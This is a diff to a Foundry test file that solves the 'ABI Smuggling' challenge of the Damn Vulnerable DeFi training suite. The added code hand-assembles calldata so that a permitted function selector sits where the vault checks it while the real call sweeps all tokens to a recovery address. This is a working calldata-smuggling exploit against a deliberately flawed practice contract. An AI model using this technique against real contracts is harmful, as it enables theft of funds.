@@ -5,12 +5,15 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 
 contract ABISmugglingChallenge is Test {
+    using Address for address;
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +76,23 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        //0x85fb709d
+        bytes memory dataActions = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));
+        bytes4 selector1 = 0x1cff79cd;
+        bytes4 selector2 = 0xd9caed12;
+        uint256 length = dataActions.length;
+
+        bytes memory call = abi.encodePacked(
+            selector1,
+            abi.encode(address(vault)),
+            abi.encode(128),
+            abi.encode(0),
+            abi.encode(selector2),
+            abi.encode(length),
+            dataActions
+        );
+
+        address(vault).functionCall(call);
     }
 
     /**
